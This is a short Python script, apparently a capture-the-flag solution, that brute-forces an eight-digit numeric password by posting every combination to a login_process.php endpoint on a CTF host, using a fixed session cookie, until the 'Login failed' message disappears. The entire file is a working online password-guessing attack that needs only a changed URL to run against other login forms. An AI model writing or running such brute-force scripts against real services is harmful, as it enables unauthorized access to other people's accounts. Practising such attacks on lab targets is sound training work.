from itertools import product
import requests

ascii_range = [_ for _ in range(33, 127)] # a-zA-z0-9!-~
# charset = ""
# for c in ascii_range:
#     charset += chr(c)
charset = "1234567890"
length = 8  # 찾고자 하는 문자열 길이

attack_url = "http://ctf.segfaulthub.com:4238/login_process.php"
cookies = {
    'PHPSESSID': '8hndha8s8f8q53ba3p1hdirvbe'
}

for attempt in product(charset, repeat=length):
    candidate = ''.join(attempt)

    data = {
        'id': '1',
        'password': candidate
    }
    response = requests.post(url=attack_url,cookies=cookies, data=data)

    res = response.text
    if "Login failed" not in res:
        print(f"success: {candidate}")
        break
    else:
        print(f"failed: {candidate}")